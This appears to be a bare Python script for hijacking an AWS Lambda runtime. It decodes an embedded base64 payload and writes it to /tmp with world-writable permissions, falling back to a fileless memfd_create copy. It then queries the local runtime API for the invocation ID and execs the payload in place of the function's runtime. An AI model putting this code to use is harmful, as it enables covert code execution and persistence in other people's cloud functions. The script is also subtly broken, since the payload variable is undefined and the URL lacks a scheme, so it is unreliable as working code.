import ctypes
import os
import sys
import urllib3
from base64 import b64decode


MEMFD_CREATE_SYSCALL = 319

new_runtime = b64decode(external_data_b64)

if os.access('/tmp', os.W_OK):
    new_runtime_path = "/tmp/new_runtime"
    with open(new_runtime_path, "wb") as f:
        f.write(new_runtime)
    os.chmod(new_runtime_path, 0o777)
else:
    memfd = ctypes.CDLL("").syscall(MEMFD_CREATE_SYSCALL, "new_runtime", 0)
    os.write(memfd, new_runtime)
    new_runtime_path = "/proc/self/fd/" + str(memfd)

http = urllib3.PoolManager()
resp = http.request("GET", "127.0.0.1:9001/2018-06-01/runtime/invocation/next")
invoke_id = resp.headers["Lambda-Runtime-Aws-Request-Id"]

args = [invoke_id]
os.execv(sys.executable, [sys.executable, new_runtime_path] + args)
